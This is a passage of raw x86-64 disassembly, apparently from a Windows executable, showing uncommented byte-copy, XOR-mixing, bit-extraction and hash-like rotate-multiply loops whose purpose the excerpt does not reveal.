   140042dbc:	mov    dl,BYTE PTR [r9+rax*1]
   140042dc0:	mov    BYTE PTR [rcx+rax*1],dl
   140042dc3:	inc    rax
   140042dc6:	jmp    0x140042db7
   140042dc8:	mov    rcx,QWORD PTR [rbp+0x7e8]
   140042dcf:	xor    eax,eax
   140042dd1:	cmp    rsi,rax
   140042dd4:	je     0x140042e02
   140042dd6:	cmp    rcx,0x3f
   140042dda:	ja     0x140059d8e
   140042de0:	mov    edx,eax
   140042de2:	and    edx,0x7
   140042de5:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140042dec:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   140042df3:	inc    rax
   140042df6:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140042dfd:	inc    rcx
   140042e00:	jmp    0x140042dd1
   140042e02:	movaps XMMWORD PTR [rbp+0x1090],xmm6
   140042e09:	movaps XMMWORD PTR [rbp+0x1080],xmm6
   140042e10:	movaps XMMWORD PTR [rbp+0x1070],xmm6
   140042e17:	movaps XMMWORD PTR [rbp+0x1060],xmm6
   140042e1e:	xor    eax,eax
   140042e20:	cmp    rax,0x40
   140042e24:	je     0x140042e3c
   140042e26:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   140042e2d:	bswap  ecx
   140042e2f:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140042e36:	add    rax,0x4
   140042e3a:	jmp    0x140042e20
   140042e3c:	movups xmm0,XMMWORD PTR [rbp+0x848]
   140042e43:	mov    eax,DWORD PTR [rbp+0x858]
   140042e49:	movups XMMWORD PTR [rbp+0xd10],xmm0
   140042e50:	mov    DWORD PTR [rbp+0xd20],eax
   140042e56:	and    DWORD PTR [rbp+0xd24],0x0
   140042e5d:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140042e64:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   140042e6b:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140042e72:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   140042e79:	lea    rax,[rbp+0xd28]
   140042e80:	movups XMMWORD PTR [rax+0x30],xmm3
   140042e84:	movups XMMWORD PTR [rax+0x20],xmm2
   140042e88:	movups XMMWORD PTR [rax+0x10],xmm1
   140042e8c:	movups XMMWORD PTR [rax],xmm0
   140042e8f:	call   0x140064214
   140042e94:	mov    al,BYTE PTR [rip+0x55bf3]        # 0x140098a8d
   140042e9a:	cmp    al,0x1
   140042e9c:	je     0x140042ee5
   140042e9e:	movzx  eax,al
   140042ea1:	cmp    eax,0x2
   140042ea4:	je     0x140042f8b
   140042eaa:	and    DWORD PTR [rbp+0x400],0x0
   140042eb1:	lea    rcx,[rip+0xfffffffffffbe1c8]        # 0x140001080
   140042eb8:	mov    rdx,QWORD PTR [rbp+0x1150]
   140042ebf:	push   0x40
   140042ec1:	pop    r8
   140042ec3:	lea    r9,[rbp+0x400]
   140042eca:	call   QWORD PTR [rip+0x51938]        # 0x140094808
   140042ed0:	test   eax,eax
   140042ed2:	sete   cl
   140042ed5:	inc    cl
   140042ed7:	mov    BYTE PTR [rip+0x55bb0],cl        # 0x140098a8d
   140042edd:	test   eax,eax
   140042edf:	je     0x140042f8b
   140042ee5:	mov    al,BYTE PTR [rip+0x55ccd]        # 0x140098bb8
   140042eeb:	cmp    al,0x1
   140042eed:	je     0x140042f12
   140042eef:	movzx  eax,al
   140042ef2:	test   eax,eax
   140042ef4:	jne    0x140042f8b
   140042efa:	call   0x140065d51
   140042eff:	test   rax,rax
   140042f02:	sete   cl
   140042f05:	inc    cl
   140042f07:	mov    BYTE PTR [rip+0x55cab],cl        # 0x140098bb8
   140042f0d:	test   rax,rax
   140042f10:	je     0x140042f8b
   140042f12:	call   0x140064227
   140042f17:	mov    eax,0xc8c291de
   140042f1c:	xchg   DWORD PTR [rip+0x55bbe],eax        # 0x140098ae0
   140042f22:	call   QWORD PTR [rip+0x51728]        # 0x140094650
   140042f28:	mov    eax,eax
   140042f2a:	mov    QWORD PTR [rip+0x550cf],rax        # 0x140098000
   140042f31:	lea    rcx,[rbp+0xd10]
   140042f38:	push   0xffffffffffffffff
   140042f3a:	pop    rdx
   140042f3b:	call   0x14002b840
   140042f40:	xor    eax,eax
   140042f42:	xchg   DWORD PTR [rip+0x55b98],eax        # 0x140098ae0
   140042f48:	mov    BYTE PTR [rip+0x55b3f],0x0        # 0x140098a8e
   140042f4f:	mov    eax,DWORD PTR [rbp+0xd10]
   140042f55:	add    DWORD PTR [rbp+0x848],eax
   140042f5b:	mov    eax,DWORD PTR [rbp+0xd14]
   140042f61:	add    DWORD PTR [rbp+0x84c],eax
   140042f67:	mov    eax,DWORD PTR [rbp+0xd18]
   140042f6d:	add    DWORD PTR [rbp+0x850],eax
   140042f73:	mov    eax,DWORD PTR [rbp+0xd1c]
   140042f79:	add    DWORD PTR [rbp+0x854],eax
   140042f7f:	mov    eax,DWORD PTR [rbp+0xd20]
   140042f85:	add    DWORD PTR [rbp+0x858],eax
   140042f8b:	mov    BYTE PTR [rip+0x55afa],0x0        # 0x140098a8c
   140042f92:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   140042f99:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140042fa0:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   140042fa7:	xor    eax,eax
   140042fa9:	cmp    rax,0x14
   140042fad:	je     0x140042fc5
   140042faf:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   140042fb6:	bswap  ecx
   140042fb8:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   140042fbf:	add    rax,0x4
   140042fc3:	jmp    0x140042fa9
   140042fc5:	mov    r8,QWORD PTR [rbp+0x7e0]
   140042fcc:	mov    eax,r15d
   140042fcf:	shr    eax,0x3
   140042fd2:	and    eax,0x1f
   140042fd5:	lea    rcx,[rax+rbp*1]
   140042fd9:	add    rcx,0xd10
   140042fe0:	xor    r9d,r9d
   140042fe3:	xor    edx,edx
   140042fe5:	xor    eax,eax
   140042fe7:	cmp    r9,0x10
   140042feb:	je     0x140043006
   140042fed:	shld   rax,rdx,0x8
   140042ff2:	mov    r10,rdx
   140042ff5:	shl    r10,0x8
   140042ff9:	movzx  edx,BYTE PTR [rcx+r9*1]
   140042ffe:	inc    r9
   140043001:	or     rdx,r10
   140043004:	jmp    0x140042fe7
   140043006:	push   0xffffffffffffffff
   140043008:	pop    r9
   14004300a:	mov    r10,r9
   14004300d:	mov    ecx,r8d
   140043010:	shl    r10,cl
   140043013:	cmp    r8,0x40
   140043017:	not    r10
   14004301a:	cmovae r10,r9
   14004301e:	and    r15d,0x7
   140043022:	lea    ecx,[r8+r15*1]
   140043026:	neg    cl
   140043028:	shrd   rdx,rax,cl
   14004302c:	shr    rax,cl
   14004302f:	test   cl,0x40
   140043032:	cmove  rax,rdx
   140043036:	and    rax,r10
   140043039:	mov    rsi,QWORD PTR [rbp+0x820]
   140043040:	add    r8,0x7
   140043044:	bswap  rax
   140043047:	shr    r8,0x3
   14004304b:	mov    QWORD PTR [rbp+0x1060],rax
   140043052:	mov    r9,rsi
   140043055:	imul   r9,r8
   140043059:	push   0x8
   14004305b:	pop    rcx
   14004305c:	sub    rcx,r8
   14004305f:	dec    r8
   140043062:	lea    rax,[rbp+0x85c]
   140043069:	lea    r11,[rax+r9*1]
   14004306d:	mov    rax,r9
   140043070:	xor    edx,edx
   140043072:	div    r13
   140043075:	cmp    rcx,0x8
   140043079:	je     0x14004309f
   14004307b:	cmp    r8,0x7
   14004307f:	ja     0x140059d80
   140043085:	imul   rax,rax,0xffffffffffffffec
   140043089:	mov    al,BYTE PTR [r11+rax*1]
   14004308d:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140043094:	inc    rcx
   140043097:	inc    r11
   14004309a:	inc    r9
   14004309d:	jmp    0x14004306d
   14004309f:	mov    r11,QWORD PTR [rbp+0x1060]
   1400430a6:	bswap  r11
   1400430a9:	and    r11,r10
   1400430ac:	inc    rsi
   1400430af:	mov    QWORD PTR [rbp+0x820],rsi
   1400430b6:	mov    r9,QWORD PTR [rbp+0x890]
   1400430bd:	mov    rax,QWORD PTR [rbp+0x880]
   1400430c4:	mov    r8,QWORD PTR [rbp+0x888]
   1400430cb:	mov    rdx,r9
   1400430ce:	sub    rdx,r8
   1400430d1:	sub    rdx,rax
   1400430d4:	mov    rcx,QWORD PTR [rbp+0x7e0]
   1400430db:	cmp    rdx,rcx
   1400430de:	cmovae rdx,rcx
   1400430e2:	cmp    rdx,0x1
   1400430e6:	adc    rdx,0x0
   1400430ea:	mov    r10d,ecx
   1400430ed:	sub    r10d,edx
   1400430f0:	and    r10b,0x3f
   1400430f4:	cmp    rcx,rdx
   1400430f7:	movzx  ecx,r10b
   1400430fb:	cmovbe ecx,edi
   1400430fe:	shr    r11,cl
   140043101:	mov    r10,QWORD PTR [rbp+0x870]
   140043108:	mov    rsi,QWORD PTR [rbp+0x878]
   14004310f:	mov    ecx,edx
   140043111:	shld   rsi,r10,cl
   140043115:	shl    r10,cl
   140043118:	test   dl,0x40
   14004311b:	cmovne rsi,r10
   14004311f:	mov    ecx,0x0
   140043124:	cmove  rcx,r10
   140043128:	or     rcx,r11
   14004312b:	mov    QWORD PTR [rbp+0x878],rsi
   140043132:	mov    QWORD PTR [rbp+0x870],rcx
   140043139:	add    rax,rdx
   14004313c:	mov    QWORD PTR [rbp+0x880],rax
   140043143:	jmp    0x140042bf2
   140043148:	add    rax,0xfffffffffffffff8
   14004314c:	mov    QWORD PTR [rbp+0x880],rax
   140043153:	mov    r9,QWORD PTR [rbp+0x878]
   14004315a:	mov    r10,r9
   14004315d:	mov    ecx,eax
   14004315f:	shr    r10,cl
   140043162:	mov    r11,QWORD PTR [rbp+0x870]
   140043169:	mov    rdx,r11
   14004316c:	shrd   rdx,r9,cl
   140043170:	push   0xffffffffffffffff
   140043172:	pop    rbx
   140043173:	mov    rsi,rbx
   140043176:	shl    rsi,cl
   140043179:	test   al,0x40
   14004317b:	cmovne rdx,r10
   14004317f:	mov    ecx,0x0
   140043184:	cmove  rcx,rsi
   140043188:	cmove  rsi,rbx
   14004318c:	not    rsi
   14004318f:	not    rcx
   140043192:	and    rcx,r11
   140043195:	and    rsi,r9
   140043198:	test   rax,rax
   14004319b:	cmove  rsi,rax
   14004319f:	cmove  rcx,rax
   1400431a3:	mov    QWORD PTR [rbp+0x870],rcx
   1400431aa:	mov    QWORD PTR [rbp+0x878],rsi
   1400431b1:	add    r8,0x8
   1400431b5:	mov    QWORD PTR [rbp+0x888],r8
   1400431bc:	lea    rsi,[rbp+0x500]
   1400431c3:	mov    rbx,QWORD PTR [rbp+0x1158]
   1400431ca:	inc    rbx
   1400431cd:	mov    rcx,rsi
   1400431d0:	call   0x14003c141
   1400431d5:	jmp    0x140042bb5
   1400431da:	lea    rbx,[rbp+0x500]
   1400431e1:	mov    rcx,QWORD PTR [rbx]
   1400431e4:	mov    rdx,QWORD PTR [rbx+0x8]
   1400431e8:	call   0x14006f7f7
   1400431ed:	mov    rcx,rbx
   1400431f0:	push   0x8
   1400431f2:	pop    rdx
   1400431f3:	call   0x14003c111
   1400431f8:	xor    edi,edi
   1400431fa:	xorps  xmm6,xmm6
   1400431fd:	lea    rsi,[rbp+0xd10]
   140043204:	xor    r14d,r14d
   140043207:	cmp    r14,0x8
   14004320b:	je     0x140043820
   140043211:	mov    r8,QWORD PTR [rbp+0x888]
   140043218:	mov    r9,QWORD PTR [rbp+0x890]
   14004321f:	lea    rax,[r8+0x8]
   140043223:	cmp    rax,r9
   140043226:	jbe    0x14004322f
   140043228:	xor    edx,edx
   14004322a:	jmp    0x140043810
   14004322f:	mov    QWORD PTR [rbp+0x1158],r14
   140043236:	mov    rax,QWORD PTR [rbp+0x880]
   14004323d:	cmp    rax,0x8
   140043241:	jae    0x14004378d
   140043247:	mov    rcx,QWORD PTR [rbp+0x820]
   14004324e:	cmp    rcx,QWORD PTR [rbp+0x828]
   140043255:	jae    0x1400432a5
   140043257:	mov    rcx,QWORD PTR [rbp+0x7d8]
   14004325e:	mov    rdx,QWORD PTR [rbp+0x818]
   140043265:	cmp    rdx,rcx
   140043268:	jae    0x1400432a5
   14004326a:	mov    rax,QWORD PTR [rbp+0x1180]
   140043271:	movzx  r14d,BYTE PTR [rax+rdx*1]
   140043276:	and    r14d,0x7f
   14004327a:	mov    r9,QWORD PTR [rbp+0x1170]
   140043281:	lea    rax,[rdx+0x1]
   140043285:	cmp    rax,rcx
   140043288:	jae    0x1400432b3
   14004328a:	movzx  r8d,BYTE PTR [r9+rdx*1+0x11]
   140043290:	test   r8b,r8b
   140043293:	jns    0x1400432ad
   140043295:	shl    r14,0x7
   140043299:	and    r8d,0x7f
   14004329d:	or     r14,r8
   1400432a0:	mov    rdx,rax
   1400432a3:	jmp    0x140043281
   1400432a5:	xor    r11d,r11d
   1400432a8:	jmp    0x140043710
   1400432ad:	inc    rdx
   1400432b0:	mov    rcx,rdx
   1400432b3:	mov    QWORD PTR [rbp+0x818],rcx
   1400432ba:	mov    rax,r14
   1400432bd:	shr    rax,0x8
   1400432c1:	mov    rbx,r14
   1400432c4:	shr    rbx,0x28
   1400432c8:	movaps XMMWORD PTR [rbp+0xfb0],xmm6
   1400432cf:	movaps XMMWORD PTR [rbp+0xfa0],xmm6
   1400432d6:	movaps XMMWORD PTR [rbp+0xf90],xmm6
   1400432dd:	movaps XMMWORD PTR [rbp+0xf80],xmm6
   1400432e4:	mov    DWORD PTR [rbp+0xd10],eax
   1400432ea:	lea    rax,[rip+0x44d67]        # 0x140088058
   1400432f1:	mov    QWORD PTR [rsp+0x20],rax
   1400432f6:	lea    rcx,[rbp+0xf80]
   1400432fd:	push   0x4
   1400432ff:	pop    rdx
   140043300:	mov    r8,rsi
   140043303:	mov    r9,rdx
   140043306:	call   0x1400638fe
   14004330b:	mov    BYTE PTR [rbp+0xf84],bl
   140043311:	mov    r15,QWORD PTR [rbp+0x7f0]
   140043318:	cmp    QWORD PTR [rbp+0x838],r15
   14004331f:	jbe    0x14004344b
   140043325:	mov    r9,QWORD PTR [rbp+0x7f8]
   14004332c:	cmp    r9,0x4
   140043330:	ja     0x140059d9c
   140043336:	mov    rcx,QWORD PTR [rbp+0x800]
   14004333d:	cmp    rcx,0x5
   140043341:	jae    0x140059dae
   140043347:	mov    r8,QWORD PTR [rbp+0x838]
   14004334e:	cmp    r8,r15
   140043351:	je     0x140059dbc
   140043357:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   14004335e:	mov    cl,BYTE PTR [rbp+0x808]
   140043364:	rol    eax,cl
   140043366:	sub    r8,r15
   140043369:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   140043371:	xor    edx,edx
   140043373:	div    r8
   140043376:	mov    r12,rdx
   140043379:	mov    rax,QWORD PTR [rbp+0x840]
   140043380:	mov    QWORD PTR [rbp+0x1060],rax
   140043387:	cmp    r15,0x40
   14004338b:	push   0x40
   14004338d:	pop    rax
   14004338e:	cmovae r15,rax
   140043392:	movaps XMMWORD PTR [rbp+0xd40],xmm6
   140043399:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   1400433a0:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   1400433a7:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   1400433ae:	mov    rcx,rsi
   1400433b1:	mov    rdx,r15
   1400433b4:	call   0x14003c0b8
   1400433b9:	mov    r10,QWORD PTR [rbp+0x838]
   1400433c0:	test   r10,r10
   1400433c3:	je     0x140043411
   1400433c5:	mov    rcx,rax
   1400433c8:	mov    r8,rdx
   1400433cb:	mov    rax,rdx
   1400433ce:	add    rax,r12
   1400433d1:	mov    r9,QWORD PTR [rbp+0x830]
   1400433d8:	cmp    rax,r10
   1400433db:	jbe    0x1400433fb
   1400433dd:	xor    r11d,r11d
   1400433e0:	cmp    r8,r11
   1400433e3:	je     0x140043411
   1400433e5:	lea    rax,[r11+r12*1]
   1400433e9:	xor    edx,edx
   1400433eb:	div    r10
   1400433ee:	mov    al,BYTE PTR [r9+rdx*1]
   1400433f2:	mov    BYTE PTR [rcx+r11*1],al
   1400433f6:	inc    r11
   1400433f9:	jmp    0x1400433e0
   1400433fb:	add    r9,r12
   1400433fe:	xor    eax,eax
   140043400:	cmp    r8,rax
   140043403:	je     0x140043411
   140043405:	mov    dl,BYTE PTR [r9+rax*1]
   140043409:	mov    BYTE PTR [rcx+rax*1],dl
   14004340c:	inc    rax
   14004340f:	jmp    0x140043400
   140043411:	mov    rcx,QWORD PTR [rbp+0x7e8]
   140043418:	xor    eax,eax
   14004341a:	cmp    r15,rax
   14004341d:	je     0x14004344b
   14004341f:	cmp    rcx,0x3f
   140043423:	ja     0x140059d8e
   140043429:	mov    edx,eax
   14004342b:	and    edx,0x7
   14004342e:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140043435:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   14004343c:	inc    rax
   14004343f:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140043446:	inc    rcx
   140043449:	jmp    0x14004341a
   14004344b:	movaps XMMWORD PTR [rbp+0x1090],xmm6
   140043452:	movaps XMMWORD PTR [rbp+0x1080],xmm6
   140043459:	movaps XMMWORD PTR [rbp+0x1070],xmm6
   140043460:	movaps XMMWORD PTR [rbp+0x1060],xmm6
   140043467:	xor    eax,eax
   140043469:	cmp    rax,0x40
   14004346d:	je     0x140043485
   14004346f:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   140043476:	bswap  ecx
   140043478:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004347f:	add    rax,0x4
   140043483:	jmp    0x140043469
   140043485:	movups xmm0,XMMWORD PTR [rbp+0x848]
   14004348c:	mov    eax,DWORD PTR [rbp+0x858]
   140043492:	movups XMMWORD PTR [rbp+0xd10],xmm0
   140043499:	mov    DWORD PTR [rbp+0xd20],eax
   14004349f:	and    DWORD PTR [rbp+0xd24],0x0
   1400434a6:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   1400434ad:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   1400434b4:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   1400434bb:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   1400434c2:	lea    rax,[rbp+0xd28]
   1400434c9:	movups XMMWORD PTR [rax+0x30],xmm3
   1400434cd:	movups XMMWORD PTR [rax+0x20],xmm2
   1400434d1:	movups XMMWORD PTR [rax+0x10],xmm1
   1400434d5:	movups XMMWORD PTR [rax],xmm0
   1400434d8:	call   0x140064214
   1400434dd:	mov    al,BYTE PTR [rip+0x555aa]        # 0x140098a8d
   1400434e3:	cmp    al,0x1
   1400434e5:	je     0x14004352e
   1400434e7:	movzx  eax,al
   1400434ea:	cmp    eax,0x2
   1400434ed:	je     0x1400435d0
   1400434f3:	and    DWORD PTR [rbp+0x400],0x0
   1400434fa:	lea    rcx,[rip+0xfffffffffffbdb7f]        # 0x140001080
   140043501:	mov    rdx,QWORD PTR [rbp+0x1150]
   140043508:	push   0x40
   14004350a:	pop    r8
   14004350c:	lea    r9,[rbp+0x400]
   140043513:	call   QWORD PTR [rip+0x512ef]        # 0x140094808
   140043519:	test   eax,eax
   14004351b:	sete   cl
   14004351e:	inc    cl
   140043520:	mov    BYTE PTR [rip+0x55567],cl        # 0x140098a8d
   140043526:	test   eax,eax
   140043528:	je     0x1400435d0
   14004352e:	mov    al,BYTE PTR [rip+0x55684]        # 0x140098bb8
   140043534:	cmp    al,0x1
   140043536:	je     0x14004355b
   140043538:	movzx  eax,al
   14004353b:	test   eax,eax
   14004353d:	jne    0x1400435d0
   140043543:	call   0x140065d51
   140043548:	test   rax,rax
   14004354b:	sete   cl
   14004354e:	inc    cl
   140043550:	mov    BYTE PTR [rip+0x55662],cl        # 0x140098bb8
   140043556:	test   rax,rax
   140043559:	je     0x1400435d0
   14004355b:	call   0x140064227
   140043560:	mov    eax,0xc8c291de
   140043565:	xchg   DWORD PTR [rip+0x55575],eax        # 0x140098ae0
   14004356b:	call   QWORD PTR [rip+0x510df]        # 0x140094650
   140043571:	mov    eax,eax
   140043573:	mov    QWORD PTR [rip+0x54a86],rax        # 0x140098000
   14004357a:	mov    rcx,rsi
   14004357d:	push   0xffffffffffffffff
   14004357f:	pop    rdx
   140043580:	call   0x14002b840
   140043585:	xor    eax,eax
   140043587:	xchg   DWORD PTR [rip+0x55553],eax        # 0x140098ae0
   14004358d:	mov    BYTE PTR [rip+0x554fa],0x0        # 0x140098a8e
   140043594:	mov    eax,DWORD PTR [rbp+0xd10]
   14004359a:	add    DWORD PTR [rbp+0x848],eax
   1400435a0:	mov    eax,DWORD PTR [rbp+0xd14]
   1400435a6:	add    DWORD PTR [rbp+0x84c],eax
   1400435ac:	mov    eax,DWORD PTR [rbp+0xd18]
   1400435b2:	add    DWORD PTR [rbp+0x850],eax
   1400435b8:	mov    eax,DWORD PTR [rbp+0xd1c]
   1400435be:	add    DWORD PTR [rbp+0x854],eax
   1400435c4:	mov    eax,DWORD PTR [rbp+0xd20]
   1400435ca:	add    DWORD PTR [rbp+0x858],eax
   1400435d0:	mov    BYTE PTR [rip+0x554b5],0x0        # 0x140098a8c
   1400435d7:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   1400435de:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   1400435e5:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   1400435ec:	xor    eax,eax
   1400435ee:	cmp    rax,0x14
   1400435f2:	je     0x14004360a
   1400435f4:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   1400435fb:	bswap  ecx
   1400435fd:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   140043604:	add    rax,0x4
   140043608:	jmp    0x1400435ee
   14004360a:	mov    r8,QWORD PTR [rbp+0x7e0]
   140043611:	mov    eax,r14d
   140043614:	shr    eax,0x3
   140043617:	and    eax,0x1f
   14004361a:	lea    rcx,[rax+rbp*1]
   14004361e:	add    rcx,0xd10
   140043625:	xor    r9d,r9d
   140043628:	xor    edx,edx
   14004362a:	xor    eax,eax
   14004362c:	cmp    r9,0x10
   140043630:	je     0x14004364b
   140043632:	shld   rax,rdx,0x8
   140043637:	mov    r10,rdx
   14004363a:	shl    r10,0x8
   14004363e:	movzx  edx,BYTE PTR [rcx+r9*1]
   140043643:	inc    r9
   140043646:	or     rdx,r10
   140043649:	jmp    0x14004362c
   14004364b:	push   0xffffffffffffffff
   14004364d:	pop    r9
   14004364f:	mov    r10,r9
   140043652:	mov    ecx,r8d
   140043655:	shl    r10,cl
   140043658:	cmp    r8,0x40
   14004365c:	not    r10
   14004365f:	cmovae r10,r9
   140043663:	and    r14d,0x7
   140043667:	lea    ecx,[r8+r14*1]
   14004366b:	neg    cl
   14004366d:	shrd   rdx,rax,cl
   140043671:	shr    rax,cl
   140043674:	test   cl,0x40
   140043677:	cmove  rax,rdx
   14004367b:	and    rax,r10
   14004367e:	mov    rbx,QWORD PTR [rbp+0x820]
   140043685:	add    r8,0x7
   140043689:	bswap  rax
   14004368c:	shr    r8,0x3
   140043690:	mov    QWORD PTR [rbp+0x1060],rax
   140043697:	mov    r9,rbx
   14004369a:	imul   r9,r8
   14004369e:	push   0x8
   1400436a0:	pop    rcx
   1400436a1:	sub    rcx,r8
   1400436a4:	dec    r8
   1400436a7:	lea    rax,[rbp+0x85c]
   1400436ae:	lea    r11,[rax+r9*1]
   1400436b2:	mov    rax,r9
   1400436b5:	xor    edx,edx
   1400436b7:	div    r13
   1400436ba:	cmp    rcx,0x8
   1400436be:	je     0x1400436e4
   1400436c0:	cmp    r8,0x7
   1400436c4:	ja     0x140059d80
   1400436ca:	imul   rax,rax,0xffffffffffffffec
   1400436ce:	mov    al,BYTE PTR [r11+rax*1]
   1400436d2:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   1400436d9:	inc    rcx
   1400436dc:	inc    r11
   1400436df:	inc    r9
   1400436e2:	jmp    0x1400436b2
   1400436e4:	mov    r11,QWORD PTR [rbp+0x1060]
   1400436eb:	bswap  r11
   1400436ee:	and    r11,r10
   1400436f1:	inc    rbx
   1400436f4:	mov    QWORD PTR [rbp+0x820],rbx
   1400436fb:	mov    r9,QWORD PTR [rbp+0x890]
   140043702:	mov    rax,QWORD PTR [rbp+0x880]
   140043709:	mov    r8,QWORD PTR [rbp+0x888]
   140043710:	mov    rdx,r9
   140043713:	sub    rdx,r8
   140043716:	sub    rdx,rax
   140043719:	mov    rcx,QWORD PTR [rbp+0x7e0]
   140043720:	cmp    rdx,rcx
   140043723:	cmovae rdx,rcx
   140043727:	cmp    rdx,0x1
   14004372b:	adc    rdx,0x0
   14004372f:	mov    r10d,ecx
   140043732:	sub    r10d,edx
   140043735:	and    r10b,0x3f
   140043739:	cmp    rcx,rdx
   14004373c:	movzx  ecx,r10b
   140043740:	cmovbe ecx,edi
   140043743:	shr    r11,cl
   140043746:	mov    r10,QWORD PTR [rbp+0x870]
   14004374d:	mov    rbx,QWORD PTR [rbp+0x878]
   140043754:	mov    ecx,edx
   140043756:	shld   rbx,r10,cl
   14004375a:	shl    r10,cl
   14004375d:	test   dl,0x40
   140043760:	cmovne rbx,r10
   140043764:	mov    ecx,0x0
   140043769:	cmove  rcx,r10
   14004376d:	or     rcx,r11
   140043770:	mov    QWORD PTR [rbp+0x878],rbx
   140043777:	mov    QWORD PTR [rbp+0x870],rcx
   14004377e:	add    rax,rdx
   140043781:	mov    QWORD PTR [rbp+0x880],rax
   140043788:	jmp    0x14004323d
   14004378d:	add    rax,0xfffffffffffffff8
   140043791:	mov    QWORD PTR [rbp+0x880],rax
   140043798:	mov    r9,QWORD PTR [rbp+0x878]
   14004379f:	mov    r10,r9
   1400437a2:	mov    ecx,eax
   1400437a4:	shr    r10,cl
   1400437a7:	mov    r11,QWORD PTR [rbp+0x870]
   1400437ae:	mov    rdx,r11
   1400437b1:	shrd   rdx,r9,cl
   1400437b5:	push   0xffffffffffffffff
   1400437b7:	pop    r14
   1400437b9:	mov    rbx,r14
   1400437bc:	shl    rbx,cl
   1400437bf:	test   al,0x40
   1400437c1:	cmovne rdx,r10
   1400437c5:	mov    ecx,0x0
   1400437ca:	cmove  rcx,rbx
   1400437ce:	cmove  rbx,r14
   1400437d2:	not    rbx
   1400437d5:	not    rcx
   1400437d8:	and    rcx,r11
   1400437db:	and    rbx,r9
   1400437de:	test   rax,rax
   1400437e1:	cmove  rbx,rax
   1400437e5:	cmove  rcx,rax
   1400437e9:	mov    QWORD PTR [rbp+0x870],rcx
   1400437f0:	mov    QWORD PTR [rbp+0x878],rbx
   1400437f7:	add    r8,0x8
   1400437fb:	mov    QWORD PTR [rbp+0x888],r8
   140043802:	lea    rbx,[rbp+0x500]
   140043809:	mov    r14,QWORD PTR [rbp+0x1158]
   140043810:	inc    r14
   140043813:	mov    rcx,rbx
   140043816:	call   0x14003c141
   14004381b:	jmp    0x140043207
   140043820:	mov    rbx,QWORD PTR [rbp+0x500]
   140043827:	mov    r14,QWORD PTR [rbp+0x508]
   14004382e:	mov    rdi,QWORD PTR [rbp+0x510]
   140043835:	add    rdi,r14
   140043838:	lea    rsi,[rbp+0xd10]
   14004383f:	mov    QWORD PTR [rsi],r14
   140043842:	mov    QWORD PTR [rsi+0x8],rdi
   140043846:	mov    QWORD PTR [rsi+0x10],0x8
   14004384e:	and    QWORD PTR [rsi+0x18],0x0
   140043853:	xor    r15d,r15d
   140043856:	mov    rcx,rsi
   140043859:	call   0x14003ba96
   14004385e:	test   rdx,rdx
   140043861:	je     0x140043873
   140043863:	movzx  edx,BYTE PTR [rdx]
   140043866:	shl    eax,0x3
   140043869:	mov    ecx,eax
   14004386b:	shl    rdx,cl
   14004386e:	or     r15,rdx
   140043871:	jmp    0x140043856
   140043873:	movabs rax,0x4f1bbcdca8279931
   14004387d:	mov    r9,r15
   140043880:	imul   r9,rax
   140043884:	rol    r9,0x11
   140043888:	xor    r9,r15
   14004388b:	movabs rax,0x6b1f30a8d4c752e9
   140043895:	mov    r10,r9
   140043898:	xor    r10,rax
   14004389b:	xorps  xmm0,xmm0
   14004389e:	movaps XMMWORD PTR [rbp+0xd10],xmm0
   1400438a5:	movaps XMMWORD PTR [rbp+0xd20],xmm0
   1400438ac:	movaps XMMWORD PTR [rbp+0xd30],xmm0
   1400438b3:	movaps XMMWORD PTR [rbp+0xd40],xmm0
   1400438ba:	movaps XMMWORD PTR [rbp+0xd50],xmm0
   1400438c1:	movaps XMMWORD PTR [rbp+0xd60],xmm0
   1400438c8:	movaps XMMWORD PTR [rbp+0xd70],xmm0
   1400438cf:	movaps XMMWORD PTR [rbp+0xd80],xmm0
   1400438d6:	movabs rax,0x1f91b0e3369d229e
   1400438e0:	xor    r9,rax
   1400438e3:	mov    r11,r10
   1400438e6:	or     r11,0x1
   1400438ea:	rol    r11,0x15
   1400438ee:	inc    QWORD PTR [rbp+0x1178]
   1400438f5:	xor    esi,esi
   1400438f7:	movabs r13,0x32a27dbe0b6bcf37
   140043901:	push   0x1f
   140043903:	pop    r12
   140043905:	cmp    rsi,0x10
   140043909:	je     0x1400439cd
   14004390f:	mov    rax,rsi
   140043912:	imul   rax,r13
   140043916:	rol    rax,0x20
   14004391a:	xor    rax,r10
   14004391d:	mov    rcx,r11
   140043920:	push   0x7
   140043922:	pop    rdx
   140043923:	mov    r8,r9
   140043926:	sub    edx,0x1
   140043929:	jb     0x14004395f
   14004392b:	mov    r15,rcx
   14004392e:	xor    r15,rax
   140043931:	add    r15,r8
   140043934:	rol    r15,0x28
   140043938:	add    rax,r15
   14004393b:	rol    rax,0xf
   14004393f:	mov    r8,rax
   140043942:	shr    r8,0x1d
